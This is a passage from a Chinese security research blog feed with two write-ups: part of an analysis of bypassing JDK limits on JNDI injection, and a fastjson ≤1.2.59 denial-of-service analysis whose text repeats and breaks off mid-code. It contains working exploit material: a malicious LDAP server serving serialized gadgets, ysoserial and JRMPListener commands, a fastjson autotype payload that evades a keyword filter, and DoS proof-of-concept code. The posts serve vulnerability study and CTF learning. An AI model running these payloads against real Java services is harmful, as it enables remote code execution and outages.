src="https://i.loli.net/2020/03/02/1rgTfH8ovDSpuVO.jpg" alt="-w924"><br><img src="https://i.loli.net/2020/03/02/Pf1lKqhun9vwUmI.jpg" alt="-w494"></p><p>再来BeanFactory.java看一下<code>ref.get(&quot;forceString&quot;)</code>是如何实现的，我们要如果构造poc控制<code>forceString</code>参数，同样的也是在Reference.java中通过遍历成员变量<code>addrs</code>数组来进行寻找：<br><img src="https://i.loli.net/2020/03/02/O7g6lvNeLXfpSI3.jpg" alt="-w702"></p><p>在Reference.java中找到控制addrs元素的办法：<br><img src="https://i.loli.net/2020/03/02/oHyqLKbNrnsXScM.jpg" alt="-w689"><br>要求我们传入一个<code>RefAddr</code>类型的<code>addr</code>，在其子类有一个<code>StringRefAddr</code>函数：<br><img src="https://i.loli.net/2020/03/02/JhUKdHYEBzVf6Qe.jpg" alt="-w935"><br>所以可以通过这样的方式来设置属性：<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">new</span> ResourceRef().add(<span class="keyword">new</span> StringRefAddr(<span class="string">"forceString"</span>, <span class="string">"xxx"</span>))</span><br></pre></td></tr></table></figure></p><p>在veracode博客中构造的beanClass是<code>javax.el.ELProcessor</code>，<code>ELProcessor</code>中有个<code>eval(String)</code>方法可以执行EL表达式，<code>javax.el.ELProcessor</code>是Tomcat8中的库，所以仅限Tomcat8及更高版本环境下可以通过该库进行攻击。</p><p><img src="/2020/02/04/JNDI注入高版本jdk绕过学习/media/15806219737687/15807884528330.jpg" alt="-w1598"></p><blockquote><p>翻了一些资料还有一些其他的类符合条件可以作为beanClass注入到BeanFactory中实现利用，比如<a href="https://blog.orange.tw/2019/02/abusing-meta-programming-for-unauthenticated-rce.html" target="_blank" rel="noopener">Orange师傅的Jenkins漏洞实现利用</a>，先挖个坑。</p></blockquote><h3 id="利用LDAP返回序列化数据，触发本地Gadget绕过高版本限制"><a href="#利用LDAP返回序列化数据，触发本地Gadget绕过高版本限制" class="headerlink" title="利用LDAP返回序列化数据，触发本地Gadget绕过高版本限制"></a>利用LDAP返回序列化数据，触发本地Gadget绕过高版本限制</h3><p>目录是一种分布式数据库，目录服务是由目录数据库和一套访问协议组成的系统。LDAP全称是轻量级目录访问协议（The Lightweight Directory Access Protocol），它提供了一种查询、浏览、搜索和修改互联网目录数据的机制，运行在TCP/IP协议栈之上，基于C/S架构。除了RMI服务之外，JNDI也可以与LDAP目录服务进行交互，Java对象在LDAP目录中也有多种存储形式：</p><ul><li>Java序列化</li><li>JNDI Reference</li><li>Marshalled对象</li><li>Remote Location (已弃用)<br>LDAP可以为存储的Java对象指定多种属性：</li><li>javaCodeBase</li><li>objectClass</li><li>javaFactory</li><li>javaSerializedData</li></ul><p>这里 javaCodebase 属性可以指定远程的URL，这样黑客可以控制反序列化中的class，通过JNDI Reference的方式进行利用。但是高版本JVM对Reference Factory远程加载类进行了安全限制，JVM不会信任LDAP对象反序列化过程中加载的远程类。</p><p>此时，攻击者仍然可以利用受害者本地CLASSPATH中存在漏洞的反序列化Gadget达到绕过限制执行命令的目的。LDAP Server除了使用JNDI Reference进行利用之外，还支持直接返回一个对象的序列化数据。如果Java对象的 <code>javaSerializedData</code> 属性值不为空，则客户端的 <code>obj.decodeObject()</code> 方法就会对这个字段的内容进行反序列化。</p><p><img src="https://i.loli.net/2020/03/02/ycH4ws3irgCq2zn.jpg" alt="-w1574"></p><p>假设客户端存在有漏洞的Apache-Commons-Collections-3.1，ldap服务端返回一个ysoserial生成的Exp：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -jar ysoserial.jar CommonsCollections6 &apos;/Applications/Calculator.app/Contents/MacOS/Calculator&apos;|base64</span><br></pre></td></tr></table></figure></p><p>ldap服务端代码：<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.unboundid.ldap.listener.InMemoryDirectoryServer;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.listener.InMemoryDirectoryServerConfig;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.listener.InMemoryListenerConfig;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.listener.interceptor.InMemoryOperationInterceptor;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.sdk.Entry;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.sdk.LDAPException;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.sdk.LDAPResult;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.sdk.ResultCode;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.util.Base64;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.net.ServerSocketFactory;</span><br><span class="line"><span class="keyword">import</span> javax.net.SocketFactory;</span><br><span class="line"><span class="keyword">import</span> javax.net.ssl.SSLSocketFactory;</span><br><span class="line"><span class="keyword">import</span> java.net.InetAddress;</span><br><span class="line"><span class="keyword">import</span> java.net.MalformedURLException;</span><br><span class="line"><span class="keyword">import</span> java.net.URL;</span><br><span class="line"><span class="keyword">import</span> java.text.ParseException;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">LdapServer</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> String LDAP_BASE = <span class="string">"dc=example,dc=com"</span>;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span> <span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">        String url = <span class="string">"http://127.0.0.1:80/#Exploit"</span>;</span><br><span class="line">        <span class="keyword">int</span> port = <span class="number">1389</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            InMemoryDirectoryServerConfig config = <span class="keyword">new</span> InMemoryDirectoryServerConfig(LDAP_BASE);</span><br><span class="line">            config.setListenerConfigs(<span class="keyword">new</span> InMemoryListenerConfig(</span><br><span class="line">                    <span class="string">"listen"</span>,</span><br><span class="line">                    InetAddress.getByName(<span class="string">"0.0.0.0"</span>),</span><br><span class="line">                    port,</span><br><span class="line">                    ServerSocketFactory.getDefault(),</span><br><span class="line">                    SocketFactory.getDefault(),</span><br><span class="line">                    (SSLSocketFactory) SSLSocketFactory.getDefault()));</span><br><span class="line"></span><br><span class="line">            config.addInMemoryOperationInterceptor(<span class="keyword">new</span> OperationInterceptor(<span class="keyword">new</span> URL(url)));</span><br><span class="line">            InMemoryDirectoryServer ds = <span class="keyword">new</span> InMemoryDirectoryServer(config);</span><br><span class="line">            System.out.println(<span class="string">"Listening on 0.0.0.0:"</span> + port);</span><br><span class="line">            ds.startListening();</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">catch</span> ( Exception e ) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="class"><span class="keyword">class</span> <span class="title">OperationInterceptor</span> <span class="keyword">extends</span> <span class="title">InMemoryOperationInterceptor</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">private</span> URL codebase;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="title">OperationInterceptor</span> <span class="params">( URL cb )</span> </span>&#123;</span><br><span class="line">            <span class="keyword">this</span>.codebase = cb;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">processSearchResult</span> <span class="params">( InMemoryInterceptedSearchResult result )</span> </span>&#123;</span><br><span class="line">            String base = result.getRequest().getBaseDN();</span><br><span class="line">            Entry e = <span class="keyword">new</span> Entry(base);</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                sendResult(result, base, e);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">catch</span> ( Exception e1 ) &#123;</span><br><span class="line">                e1.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">     <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">sendResult</span> <span class="params">( InMemoryInterceptedSearchResult result, String base, Entry e )</span> <span class="keyword">throws</span> LDAPException, MalformedURLException </span>&#123;</span><br><span class="line">            URL turl = <span class="keyword">new</span> URL(<span class="keyword">this</span>.codebase, <span class="keyword">this</span>.codebase.getRef().replace(<span class="string">'.'</span>, <span class="string">'/'</span>).concat(<span class="string">".class"</span>));</span><br><span class="line">            System.out.println(<span class="string">"Send LDAP reference result for "</span> + base + <span class="string">" redirecting to "</span> + turl);</span><br><span class="line">            e.addAttribute(<span class="string">"javaClassName"</span>, <span class="string">"Exploit"</span>);</span><br><span class="line">            String cbstring = <span class="keyword">this</span>.codebase.toString();</span><br><span class="line">            <span class="keyword">int</span> refPos = cbstring.indexOf(<span class="string">'#'</span>);</span><br><span class="line">            <span class="keyword">if</span> ( refPos &gt; <span class="number">0</span> ) &#123;</span><br><span class="line">                cbstring = cbstring.substring(<span class="number">0</span>, refPos);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">// Payload1: Return Evil Reference Factory</span></span><br><span class="line"><span class="comment">//            e.addAttribute("javaCodeBase", cbstring);</span></span><br><span class="line"><span class="comment">//            e.addAttribute("objectClass", "javaNamingReference");</span></span><br><span class="line"><span class="comment">//            e.addAttribute("javaFactory", this.codebase.getRef());</span></span><br><span class="line"></span><br><span class="line">            <span class="comment">//Payload2: Return Evil Serialized Gadget</span></span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="comment">// java -jar ysoserial.jar CommonsCollections6 '/Applications/Calculator.app/Contents/MacOS/Calculator'|base64</span></span><br><span class="line">                e.addAttribute(<span class="string">"javaSerializedData"</span>, Base64.decode(<span class="string">"rO0ABXNyABFqYX..."</span>));</span><br><span class="line">            &#125; <span class="keyword">catch</span> (ParseException e1) &#123;</span><br><span class="line">                e1.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line">            result.sendSearchEntry(e);</span><br><span class="line">            result.setResult(<span class="keyword">new</span> LDAPResult(<span class="number">0</span>, ResultCode.SUCCESS));</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>jdk8u201测试结果：<br><img src="https://i.loli.net/2020/03/02/1uwQWShxHlEdX2f.jpg" alt="-w1415"></p><p>这种绕过方式需要利用一个本地的反序列化利用链，来结合JNDI注入的入口来利用。</p><h3 id="利用JRMP触发本地gadget"><a href="#利用JRMP触发本地gadget" class="headerlink" title="利用JRMP触发本地gadget"></a>利用JRMP触发本地gadget</h3><p>JRMP(Java Remote Method Protocol)，Java远程方法协议，类比于HTTP协议是基于TCP/IP协议，RMI即基于JRMP协议。JRMP规定了RMI通信过程的数据格式等。</p><p>以<a href="https://mp.weixin.qq.com/s?__biz=MzU4MTg1NzAzMA==&amp;mid=2247483796&amp;idx=1&amp;sn=ce4249ba61d7f402a1211e508f83d2b4&amp;chksm=fd407bfdca37f2ebd51202f8221d320ccd639fd48d6a2adcb53c17ccb143fc3f037e6198662a&amp;mpshare=1&amp;scene=23&amp;srcid=&amp;sharer_sharetime=1577970121763&amp;sharer_shareid=b6a93c2ad862a6198898de9305c515e1#rd" target="_blank" rel="noopener">空指针公开赛CTF-treasure</a>这题为例，题目源码：<a href="media/15806219737687/treasure.zip">treasure</a><br>高版本jdk8u201(默认不开远程类加载)，fastjson1.2.61，标准的解析json：me/firesun/treasure/controller/SubmitController.java<br><img src="https://i.loli.net/2020/03/02/MsNVwBRhZD9PO5p.jpg" alt="-w1273"><br>SubmitController.java中开启了<code>autotype</code>：<br><img src="https://i.loli.net/2020/03/02/VzY9sZq45twDLF8.jpg" alt="-w669"></p><p>中间件中LogAspect.java检测type关键字，这里用<code>\x</code>16进制编码绕就行了，在之前的文章<a href="mweblib://15802654101358" target="_blank" rel="noopener">Fastjson 反序列化触发流程分析</a>中有分析。<br><img src="https://i.loli.net/2020/03/02/yjSiI3gXMuwn8CA.jpg" alt="-w1102"></p><p>接着就是寻找JNDI注入点，全局搜<code>lookup(</code>：<br><img src="https://i.loli.net/2020/03/02/YecC15TrqWRO6X7.jpg" alt="-w1269"></p><blockquote><p>还是有点问题，搜不了class文件，可以mvn拉下源码全局搜<br>/org/apache/commons/proxy/provider/remoting/RmiProvider.class中有一处<code>lookup</code>函数调用：<br><img src="https://i.loli.net/2020/03/02/7Gkxnt86E1ZHYmf.jpg" alt="-w1376"><br>参数<code>name</code>利用fastjson解析json数据自动调用<code>setXX</code>方法设置：<br><img src="https://i.loli.net/2020/03/02/tMP4ETxHcmSfupy.jpg" alt="-w716"><br>再看看reg变量: RmiProvider.class#getRegistry，也就是rmi的客户端实现</p></blockquote><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">RmiProvider</span> <span class="keyword">implements</span> <span class="title">ObjectProvider</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> String host = <span class="string">"localhost"</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span> port = <span class="number">1099</span>;</span><br><span class="line">    <span class="comment">//...</span></span><br><span class="line">    <span class="function"><span class="keyword">private</span> Registry <span class="title">getRegistry</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">this</span>.clientSocketFactory != <span class="keyword">null</span> ? LocateRegistry.getRegistry(<span class="keyword">this</span>.host, <span class="keyword">this</span>.port, <span class="keyword">this</span>.clientSocketFactory) : LocateRegistry.getRegistry(<span class="keyword">this</span>.host, <span class="keyword">this</span>.port);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (RemoteException var2) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> ObjectProviderException(<span class="string">"Unable to locate registry at "</span> + <span class="keyword">this</span>.host + <span class="string">":"</span> + <span class="keyword">this</span>.port + <span class="string">"."</span>, var2);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//...</span></span><br></pre></td></tr></table></figure><p>构造一个JRMP Server，利用RMI触发，在依赖库里引用了<code>commons-collections3.2</code>,使用ysoserial的commonscollections5：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -cp ysoserial.jar ysoserial.exploit.JRMPListener 1088 CommonsCollections5 &apos;/Applications/Calculator.app/Contents/MacOS/Calculator&apos;</span><br></pre></td></tr></table></figure></p><p>submit路由发送：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;@\u0074ype&quot;:&quot;org.apache.commons.proxy.provider.remoting.RmiProvider&quot;,&quot;host&quot;:&quot;127.0.0.1&quot;,&quot;port&quot;:&quot;1088&quot;,&quot;name&quot;:&quot;Object&quot;&#125;</span><br></pre></td></tr></table></figure></p><p><img src="https://i.loli.net/2020/03/02/j8RoNAiJ1E4DfpW.jpg" alt="-w1032"></p><blockquote><p>同样也要求classpath中的类有反序列化漏洞，借助Registry的入口实现命令执行。</p></blockquote><h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>文章研究了多个jdk版本的多种jndi注入方式，以及高版本利用限制分析和绕过方式，收获颇为丰富。</p><p>参考文章：</p><ul><li><a href="https://kingx.me/Exploit-Java-Deserialization-with-RMI.html" target="_blank" rel="noopener">kingx: 深入理解JNDI注入与Java反序列化漏洞利用</a></li><li><a href="https://kingx.me/Restrictions-and-Bypass-of-JNDI-Manipulations-RCE.html" target="_blank" rel="noopener">kingx: 如何绕过高版本JDK的限制进行JNDI注入利用</a></li><li><a href="https://www.veracode.com/blog/research/exploiting-jndi-injections-java" target="_blank" rel="noopener">Exploiting JNDI Injections in Java</a></li><li><a href="https://www.cnblogs.com/Welk1n/p/11066397.html" target="_blank" rel="noopener">Welkin: 浅析JNDI注入Bypass</a></li></ul>]]></content>
    
    <summary type="html">
    
      &lt;hr&gt;
    
    </summary>
    
      <category term="Web" scheme="http://0day.design/categories/Web/"/>
    
    
      <category term="Java" scheme="http://0day.design/tags/Java/"/>
    
      <category term="漏洞分析" scheme="http://0day.design/tags/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
    
  </entry>
  
  <entry>
    <title>FastJson 拒绝服务攻击分析 (&lt;=1.2.59)</title>
    <link href="http://0day.design/2020/02/01/fastjson%E6%8B%92%E7%BB%9D%E6%9C%8D%E5%8A%A1%E6%94%BB%E5%87%BB%E5%88%86%E6%9E%90/"/>
    <id>http://0day.design/2020/02/01/fastjson拒绝服务攻击分析/</id>
    <published>2020-02-01T05:05:00.000Z</published>
    <updated>2020-02-01T08:27:53.245Z</updated>
    
    <content type="html"><![CDATA[<hr><a id="more"></a><p>最近在翻资料的时候发现了这样一个有意思的漏洞，简而言之，漏洞产生的原因是开发对输入数据考虑不周全，致使一个索引指针越界，导致拒绝服务的问题。比如我们输入16进制<code>\x0a</code>，而开发未考虑到恶意攻击者如果只输入<code>\x</code>，将会导致索引指针往后移动了两个指向了数据之外(越界)的地方.</p><h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>pom.xml<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- https://mvnrepository.com/artifact/com.alibaba/fastjson --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.alibaba<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>fastjson<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.2.59<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure></p><p>poc:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">import com.alibaba.fastjson.JSON;</span><br><span class="line"></span><br><span class="line">public class test &#123;</span><br><span class="line">    public static void main(String[] args)&#123;</span><br><span class="line">        String DEATH_STRING = &quot;&#123;\&quot;a\&quot;:\&quot;\\x&quot;;//输入字符串长度为8</span><br><span class="line">        JSON.parse(DEATH_STRING);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p><img src="https://i.loli.net/2020/02/01/XH6MOyIndgAazUu.jpg" alt="-w1047"></p><h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>在这篇文章里介绍了fastjson解析json串的机制：<a href="https://zonghaishang.gitbooks.io/fastjson-source-code-analysis/content/lexer/lexer_part2.html" target="_blank" rel="noopener">fastjson源码解析：JSON Token解析</a>，这里我们记住<code>bp</code>为读取字符串的指针、<code>sp</code>为字符缓存区索引就好了:<br><img src="https://i.loli.net/2020/02/01/aZCNeRt87dbIxWK.jpg" alt="-w491"><br><img src="https://i.loli.net/2020/02/01/IAaUY47cdXhi5vJ.jpg" alt="-w513"></p><p>直接来看解析16进制的代码位置：/parser/JSONLexerBase.java#scanString<br><img src="https://i.loli.net/2020/02/01/bTxHlarRm3jFY91.jpg" alt="-w1432"></p><p>跟进<code>next</code>函数：JSONScanner.java#next()<br><img src="https://i.loli.net/2020/02/01/FN8qn5ctdGhai6R.jpg" alt="-w881"><br>先给索引指针进行了自增赋值，接着判断索引和实际长度的比较，如果索引比实际长度长或者相等则返回<code>EOI</code>,否则返回当前索引指向的字符：<br><img src="https://i.loli.net/2020/02/01/xdvDO7LKCX8zhIG.jpg" alt="-w480"><br>经过第一次的<code>next</code>处理，已经返回<code>EOI(0x1A)</code>了：<br><img src="https://i.loli.net/2020/02/01/m1JR3FkLyOMNqiI.jpg" alt="-w967"></p><p>但是他又调用了一次<code>next</code>(即默认信任用户输入<code>\x</code>后跟两位字符)，此时索引的指针<code>bp</code>为9了，已经越界了：<br><img src="https://i.loli.net/2020/02/01/cFEsqZAHXrbJ8hK.jpg" alt="-w914"></p><p>然后经过<code>putChar</code>函数，<code>break</code>了<code>switch</code>分支，继续进行这个循环：<br><img src="https://i.loli.net/2020/02/01/z8mGXYlgw5Ire1L.jpg" alt="-w1125"></p><p>跟进<code>isEOF</code>函数：JSONScanner.java#isEOF：<br><img src="https://i.loli.net/2020/02/01/Jw8ntRMlxCOGEWe.jpg" alt="-w1013"><br><code>bp+1</code>已经远大于len了，这个条件永远只能返回<code>false</code>。</p><p>跟进<code>putChar</code>函数，如果<code>sp</code>和缓存字符长度相对后，则申请一个<code>char</code>占用当前<code>sbuf.length</code>的两倍：<br><img src="https://i.loli.net/2020/02/01/M23WcdP9eHsNVfC.jpg" alt="-w920"><br>所以最后的结果就是进入一个死循环且成倍申请内存：<br><img src="https://i.loli.net/2020/02/01/fE3qtAvbSxk2WsL.jpg" alt="-w709"></p><h2 id="最后"><a href="#最后" class="headerlink" title="最后"></a>最后</h2><p>在新版本1.2.60中，修改了<code>isEOF</code>函数的判断条件：<br><img src="https://i.loli.net/2020/02/01/bTCiL7rKJkeX32g.jpg" alt="-w677"><br>并且增加了<code>x1</code>和<code>x2</code>的校验：<br><img src="https://i.loli.net/2020/02/01/1ISo2JAbzUKHNVX.jpg" alt="-w1043"></p><p>其次，在实际的测试中并没有理想中的拒绝服务效果，使用多线程占用也就从100多M涨到2.5G的样子。<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">fastjsonDos</span> <span class="keyword">implements</span> <span class="title">Runnable</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span></span>&#123;</span><br><span class="line">        <span class="keyword">new</span> Thread(<span class="keyword">new</span> fastjsonDos()).start();</span><br><span class="line">        <span class="keyword">new</span> Thread(<span class="keyword">new</span> fastjsonDos()).start();</span><br><span class="line">        <span class="keyword">new</span> Thread(<span class="keyword">new</span> fastjsonDos()).start();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        String DEATH_STRING = <span class="string">"&#123;\"a\":\"\\x"</span>;</span><br><span class="line">        JSON.parse(DEATH_STRING);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p><img src="https://i.loli.net/2020/02/01/MWiutJRaxqD1NZH.jpg" alt="-w882"></p><p>后来学习到，java启动的时候可以通过<code>-Xmx</code>参数为jvm设置最大内存占用，默认为主机的四分之一。</p><p>其次Java的OutOfMemoryError是JVM内部的异常，是一个可捕获异常，并不会直接导致java进程被Kill掉，顶多线程挂掉。</p><p>在Linux下当应用程序内存超出内存上限时，会触发OOM Killer机制以保持系统空间正常运行，java默认最大1/4物理内存占用，还不太容易导致系统的OOM。</p><p>总的来说，漏洞危害有限，但是利用过程还是挺看细节的，有一些值得学习的点~</p><p>参考文章：</p><ul><li><a href="https://zonghaishang.gitbooks.io/fastjson-source-code-analysis/content/lexer/lexer_part2.html" target="_blank" rel="noopener">fastjson源码解析：JSON Token解析</a></li><li><a href="https://nosec.org/home/detail/2933.html" target="_blank" rel="noopener">FastJson拒绝服务漏洞分析</a></li><li><a href="https://blog.csdn.net/liukuan73/article/details/43238623" target="_blank" rel="noopener">Linux内核OOM机制的详细分析</a></li></ul><h1 id="FastJson-拒绝服务攻击分析-lt-1-2-59"><a href="#FastJson-拒绝服务攻击分析-lt-1-2-59" class="headerlink" title="FastJson 拒绝服务攻击分析 (&lt;=1.2.59)"></a>FastJson 拒绝服务攻击分析 (&lt;=1.2.59)</h1><p>最近在翻资料的时候发现了这样一个有意思的漏洞，简而言之，漏洞产生的原因是开发对输入数据考虑不周全，致使一个索引指针越界，导致拒绝服务的问题。比如我们输入16进制<code>\x0a</code>，而开发未考虑到恶意攻击者如果只输入<code>\x</code>，将会导致索引指针往后移动了两个指向了数据之外(越界)的地方.</p><h2 id="漏洞复现-1"><a href="#漏洞复现-1" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>pom.xml<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- https://mvnrepository.com/artifact/com.alibaba/fastjson --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.alibaba<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>fastjson<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.2.59<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure></p><p>poc:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">import com.alibaba.fastjson.JSON;</span><br><span class="line"></span><br><span class="line">public class test &#123;</span><br><span class="line">    public static void main(String[] args)&#123;</span><br><span class="line">        String DEATH_STRING = 